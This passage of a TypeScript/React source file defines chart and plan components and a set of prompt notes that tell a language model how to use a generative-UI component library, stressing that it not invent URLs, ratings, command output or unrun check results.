                <div className="flex min-w-0 items-baseline justify-between gap-3">
                  <span className={cn(BODY, "min-w-0 font-medium")} title={stage.label}>{stage.label}</span>
                  <span className={cn(META, "shrink-0 tabular-nums")}>{new Intl.NumberFormat().format(value)}{index > 0 && first > 0 ? ` · ${retained}%` : ""}</span>
                </div>
                <div className="h-3 overflow-hidden rounded-full bg-muted">
                  <div className="h-full rounded-full transition-[width]" style={{ width: `${width}%`, background: chartColor(index) }} />
                </div>
              </div>
            )
          })}
        </div>
      </Box>
    )
  },
})

const Waterfall = defineComponent({
  name: "Waterfall",
  description: "A waterfall chart showing how positive and negative changes build to a total.",
  props: z.object({
    items: z.array(z.object({ label: z.string(), value: z.number(), total: z.boolean().optional() })),
    title: z.string().optional(),
  }),
  component: ({ props }) => {
    const running: number[] = []
    let current = 0
    for (const item of props.items) {
      const next = item.total ? item.value : current + item.value
      running.push(next)
      current = next
    }
    const bounds = props.items.flatMap((item, index) => [item.total ? 0 : (index === 0 ? 0 : running[index - 1]), running[index]])
    const min = Math.min(0, ...bounds)
    const max = Math.max(0, ...bounds)
    const range = max - min || 1
    const chartTop = 16
    const chartBottom = 176
    // The floor is a phone panel's content width, so a waterfall does not open a
    // scroller the reader has to drag to see the total at the end of it.
    const chartWidth = Math.max(320, props.items.length * 56)
    const y = (value: number) => chartTop + ((max - value) / range) * (chartBottom - chartTop)
    const step = props.items.length ? chartWidth / props.items.length : chartWidth
    const barWidth = Math.min(42, step * 0.56)
    return (
      <Box className="w-full overflow-hidden">
        {props.title && <BoxHeader title={props.title} />}
        {props.items.length === 0 ? (
          <div className={cn(META, PAD)}>No values to chart.</div>
        ) : (
          <div className="overflow-x-auto px-2 py-3 @panel-sm:px-3">
            <svg className="h-52 w-full" style={{ minWidth: `${chartWidth}px` }} viewBox={`0 0 ${chartWidth} 220`} role="img" aria-label={props.title ?? "Waterfall chart"}>
              <line x1="0" x2={chartWidth} y1={y(0)} y2={y(0)} stroke="var(--border)" strokeDasharray="3 4" />
              {props.items.map((item, index) => {
                const before = index === 0 ? 0 : running[index - 1]
                const after = running[index]
                const start = item.total ? 0 : before
                const top = Math.min(y(start), y(after))
                const height = Math.max(2, Math.abs(y(after) - y(start)))
                const x = index * step + (step - barWidth) / 2
                const fill = item.total ? "var(--chart-1)" : item.value < 0 ? "var(--destructive)" : "var(--chart-2)"
                return (
                  <g key={`${item.label}-${index}`}>
                    {index < props.items.length - 1 && <line x1={x + barWidth} x2={(index + 1) * step + (step - barWidth) / 2} y1={y(after)} y2={y(after)} stroke="var(--muted-foreground)" strokeOpacity="0.35" strokeDasharray="3 3" />}
                    <rect x={x} y={top} width={barWidth} height={height} rx="4" fill={fill}>
                      <title>{`${item.label}: ${new Intl.NumberFormat().format(item.value)}${item.total ? " (total)" : ""}`}</title>
                    </rect>
                    <text x={x + barWidth / 2} y={Math.max(12, top - 5)} textAnchor="middle" className="fill-muted-foreground" fontSize="10">{new Intl.NumberFormat(undefined, { notation: "compact", maximumFractionDigits: 1 }).format(item.value)}</text>
                    <text x={x + barWidth / 2} y="198" textAnchor="middle" className="fill-muted-foreground" fontSize="12">{item.label.length > 11 ? `${item.label.slice(0, 10)}...` : item.label}</text>
                  </g>
                )
              })}
            </svg>
          </div>
        )}
      </Box>
    )
  },
})

/** A plan: a goal over a checklist, with a done/total count. The checklist is
    the composer's own (`TodoChecklist`), so a plan and the thread's todo list
    read as the same thing. */
const PLAN_STATUS = { done: "completed", active: "in_progress", pending: "pending" } as const
const Plan = defineComponent({
  name: "Plan",
  description: "A plan: a title and goal over checklist steps, each pending, active or done, with an optional note and priority, and a done count.",
  props: z.object({
    title: z.string(),
    steps: z.array(
      z.object({
        text: z.string(),
        status: z.enum(["done", "active", "pending"]).optional(),
        note: z.string().optional(),
        priority: z.enum(["high", "medium", "low"]).optional(),
      })
    ),
    goal: z.string().optional(),
  }),
  component: ({ props }) => {
    const done = props.steps.filter((step) => step.status === "done").length
    return (
      <Box>
        <BoxHeader title={props.title} meta={props.goal} />
        <div className={cn(PAD, "space-y-2")}>
          <div className={cn(META, "tabular-nums")}>{done}/{props.steps.length} done</div>
          <TodoChecklist
            items={props.steps.map((step) => ({
              content: step.text,
              status: PLAN_STATUS[step.status ?? "pending"],
              note: step.note,
              priority: step.priority,
            }))}
          />
        </div>
      </Box>
    )
  },
})

/** What each group's section tells the model beyond its signatures. The names
    and membership are \`groups.ts\`'s; a note must only mention components of its
    own group, because a narrowed prompt drops every other section. */
const GROUP_NOTES: Record<string, string[]> = {
  layout: [
    "- `root = Stack([...])` is the entry point: every program must define it.",
    '- Use direction "row" for a cluster of cards; never nest a Stack in a Stack for spacing alone.',
    "- Tabs for alternatives the reader picks between (per OS, before/after); Accordion for FAQs; Details for one optional fold.",
  ],
  text: [
    "- Use `Markdown(text)` for a document-shaped passage with headings, paragraphs, lists, tables, blockquotes or fenced code; use `Section` or other structured components for data and status.",
    "- Markdown links open only http(s) addresses, in a new tab; never include a URL you were not given.",
    "- Verdict opens an answer that has a conclusion: `Verdict(\"Safe to merge\", \"success\", \"One sentence of why.\", [\"3 files\", \"tests pass\"])`. Headline first, then tone (neutral, info, success, warn, error), then one supporting sentence and up to four short facts. Use it at most once, as the first thing in the view; never for a result that is not a conclusion.",
    "- Write each table row as its own array of strings, in the SAME order as `columns`.",
    "- Choose the grid by what a cell holds: Table for values and words, Matrix when most cells are a yes/no/partial answer, Rows when two cells are paragraphs.",
    "- Matrix: every cell after the first column opens with `yes`, `no`, `partial` or `n/a` and may follow it with a few words (`\"yes, per request\"`, `\"no\"`, `\"partial - whole prompt only\"`). The first column names the row. Never fill a Matrix with free prose; that is a Table.",
    "- A short answer is prose; reach for these when the answer is a structure.",
    "- Compare for weighing options, Badges for short statuses, People for who is involved.",
    "- A link is the words and the address they open: `Link` for one, `Links` for several. Draw the link instead of pasting a URL into a sentence, and never write an address you were not given.",
    "- `Rows` is the triage list: one row per issue, ticket, pull request, follow-up or source, with a state chip (`status`, `tone`), a line of facts (`meta`), the detail (`text`) and a link out (`href`). It is what a table becomes when two of a row's cells are paragraphs.",
    "- In `Rows`, `tone` is colour and `status` is the word: always give the status a tone is drawn for, never a colour on its own.",
    "- Use for a pulled quotation or cited excerpt (a line from a document, a person, a spec) that should stand apart from your own prose; not for your own summaries or emphasis.",
    "- text and source are plain strings only: no markdown, no links or URLs as links. Put author, document and section together in source, e.g. \"Jane Doe, Annual Report, section 3\".",
    "- Omit source when there is no attribution. Quote the words verbatim and without surrounding quotation marks; the component marks it as a quote.",
  ],
  interactive: [
    "- A Button asks for words: `Button(\"Explain this\", Action([@ToAssistant(\"Explain the week 3 dip\")]))` fills the reader's composer, unsent, and sends nothing by itself. A view cannot reach the server, so never write a Query or a Mutation.",
    "- `Button(\"Label\")` with no action means `Action([@ToAssistant(\"Label\")])`; write the action's sentence for the words you want said when that is not the label.",
    "- `$variables` are the view's own state: `$range = \"7d\"` declares one, a field binds it as its last argument, and anything in the program reads it as `$range`. Changing a field re-evaluates the program.",
    "- Filter what you already drew rather than what you would have to fetch: `@Each(@Filter(rows, \"week\", \"==\", $range), \"r\", ...)` — the rows are in the program, and there is no tool to call.",
    "- Values in $variables are strings, numbers or booleans, never arrays or objects.",
    "- A field is named, not labelled: `Input(\"symbol\", \"e.g. AAPL\")`, and `FormControl(\"Symbol\", Input(...))` puts the label above it.",
    "- A form is a run of FormControls and a Button that sends them: `Form(\"refactor\", Button(\"Ask about this\"), [field1, field2])`. What the reader typed travels with that button's message, so do not repeat it in prose.",
    "- `rules` takes the builtin validators — `{required: true, email: true, minLength: 3}` — and a submit refuses to fire until they pass.",
    "- `Slider(\"budget\", 0, 100, 5, $budget)` is a number from a range: name, min, max, then step and value. `Checkbox(\"deep\", \"Include subfolders\", $deep)` is one on/off choice.",
    "- `@OpenUrl(\"https://...\")` opens a browser tab; use it only for a URL you were given, never one you guessed.",
    "- Draw an interactive view only when the answer is a decision the reader makes before the next message — a range to look at, an item to act on, a command to confirm. Never draw a field whose value nothing reads.",
  ],
  process: [
    "- Timeline for ordered steps or history, Plan for a proposed or in-progress task checklist.",
    "- Steps for instructions the reader follows in order (install, setup, a how-to); Timeline for events over time, Plan for a task checklist with status.",
    "- Each step needs a short imperative title; put the command or snippet in `code` (raw, no fences or prompt characters) and the why in `text`.",
    "- Checks is the report after something ran or was verified (tests, a build, a lint, a health probe, a requirements list): each item a name, a state of pass, fail, warn, skip or running, and a detail only when it adds something. Plan is work still to do; Checks is what happened. Never mark a check pass that was not run.",
  ],
  dev: [
    "- Diff for a before/after of text, Keys for shortcuts, Code for a snippet.",
    "- Use FileTree to show a project layout or the set of files a change touches; give flat slash-separated paths (e.g. \"src/lib/a.ts\") and the component nests them, so never write folders as separate entries.",
    "- Give only files, one object per file; set change to added/modified/deleted only when the answer is about a change, and keep note to a few words about what the file is or what changed.",
    "- Use Terminal when the answer is a shell session (a command and what it printed); use Code for a plain snippet or log with no command.",
    "- Terminal command is the bare line without a leading \"$ \" (the prompt is drawn for you); output is the verbatim stdout/stderr, never summarised or invented.",
    "- ChangeSet is the files a change touched, flat and in reading order: `{path, added, removed, status, note}` with the real line counts from `git diff --numstat` (omit `added`/`removed` when you do not have them, never guess), status added, modified, deleted or renamed, and a note of a few words on what changed in that file. Use FileTree for a layout, ChangeSet for a diff, a commit or a pull request.",
    "- Findings is a review's output, one item per problem: `{title, severity, location, text, fix}` with severity critical, high, medium, low or info, location as `path/to/file.ext:42`, the explanation in `text` and the correction in `fix`. Write them in any order, they draw worst first. Only report what you can point at; no findings is a sentence of prose, not an empty Findings.",
    "- Terminal exitCode is the number the command returned (0 = success, shown with a red badge otherwise); cwd is a path label. Omit both rather than guessing. Nothing is executed.",
  ],
  diagrams: [
    "- Flowchart is for branching logic. Give nodes and edges; every edge's `from` and `to` must match node ids.",
    "- Flowcharts are locally interactive: readers can move nodes, connect handles, select elements and delete them. Edits are temporary and do not change the generated answer or run tools.",
    '- Keep a flowchart under ~12 nodes. Its layout responds to the available panel width: rightward pipelines automatically become vertical in narrow panels, and wide sibling layers wrap to fit.',
    "- Use Sequence for who-calls-whom over time (request flows, auth handshakes, protocol exchanges); use a Flowchart for branching logic.",
    "- Sequence: list every actor once in actors, in left-to-right order; each message's from and to must match an actor name exactly (a message naming an unlisted actor is dropped). Messages are listed top to bottom in time order.",
    "- Sequence kind defaults to \"call\" (solid arrow from to); \"reply\" is a dashed return arrow; \"note\" is a boxed remark over from (and to, if different). Keep text short, a few words, and keep to about 6 actors or fewer.",
    "- Use Quadrant to prioritise or position a handful of items on two judgements (impact/effort, risk/likelihood, build/buy).",
    "- Quadrant: give x and y as 0-100 where 100 is the high end of the labelled axis (x runs left to right, y bottom to top); keep to about 4-12 points with short labels.",
    "- Quadrant corners, if given, is exactly four short captions in the order top-left, top-right, bottom-left, bottom-right (e.g. \"Quick wins\", \"Big bets\", \"Fill-ins\", \"Money pits\").",
  ],
  numbers: [
    "- `values` must be the same length as `labels` for Chart; Heatmap rows should match the column count.",
    "- Bars ranks values: one bar per row scaled to the largest, `{label, value, hint, tone}` with `unit` (\"ms\", \" tokens\", \"%\") appended to every value. Use it for hits per bug, time per step, tokens per tool; use Chart for a trend over shared labels and Breakdown for the parts of one total. Sort the items largest first yourself.",
    "- Prefer StatRow for a handful of figures, Sparkline for a compact metric trend, and Chart for a full trend or comparison.",
    "- Breakdown is for parts of one total: a set of counts that add up (the states of a queue, where the budget went). Give it the tones the parts deserve and let it say the shares; do not repeat the same counts in a table beside it.",
    "- Heatmap shows values across two dimensions; Funnel shows stage retention; Waterfall shows additive increases/decreases and explicit totals.",
    "- Chart kind: line/area for trends, bar for comparisons (stacked for parts of a total), pie/donut for shares of one whole (few slices), radar for scoring options on several axes.",
  ],
  media: [
    "- Image only with a URL you were actually given; never invent one. Remote images are loaded only when the reader clicks.",
    "- Gallery for several images.",
  ],
  places: [
    "- Map coordinates are latitude and longitude in degrees; latitude is -90 to 90 and longitude is -180 to 180.",
    "- Map is an interactive Google map the reader can pan, zoom, plan routes on and search for gas, hotels and food along; it does not resolve place names, so always give coordinates.",
    "- Map routes list stops by location label (at least two). Use drive, bike or walk for directions and line for flights or sea legs; the reader can also plan their own route on the map.",
    "- CardGrid for places, hotels or products: a title, short text, a meta line (e.g. distance), tags, a 0-5 rating, a price line, up to four facts (e.g. Best time, Stay, Cost) and an optional photo. Fill in the facts and price you actually know; leave out what you do not, and never invent a rating. Give `image` only a URL you were actually given; without one the card gets a colour banner.",
    "- On a CardGrid item, latitude and longitude add a Show on map button; one map opens at the bottom of the grid, only when a card is picked; pass `carousel` true to lay the cards out as a swipeable row. Set the grid's `origin` (label, latitude, longitude) to add driving directions from the traveller's start. Prefer this over a separate Map for a trip.",
    "- Cards need no image: one \"Show photos\" click per set loads the URLs you gave and, for any card with latitude and longitude, a photo of that place by name. Only give `image` a URL you were actually given.",
  ],
}

export const openuiLibrary = createLibrary({
  root: "Stack",
  components: [
    Stack,
    Card,
    Section,
    StatRow,
    Stat,
    Sparkline,
    Markdown,
    Heatmap,
    Map,
    Funnel,
    Waterfall,
    Table,
    List,
    Callout,
    Code,
    Chart,
    Progress,
    Breakdown,
    KeyValue,
    EmptyState,
    Divider,
    Image,
    Badges,
    Link,
    Links,
    Rows,
    Timeline,
    Plan,
    Compare,
    Details,
    Tabs,
    Accordion,
    Diff,
    Keys,
    People,
    Gallery,
    CardGrid,
    Flowchart,
    Quote,
    Steps,
    FileTree,
    Terminal,
    Sequence,
    Quadrant,
    Verdict,
    Matrix,
    Checks,
    ChangeSet,
    Findings,
    Bars,
    Button,
    Form,
    FormControl,
    Input,
    Textarea,
    Select,
    SelectItem,
    Checkbox,
    Slider,
  ],
  componentGroups: UI_GROUPS.map((group) => ({ name: group.label, components: group.components, notes: GROUP_NOTES[group.id] ?? [] })),
})
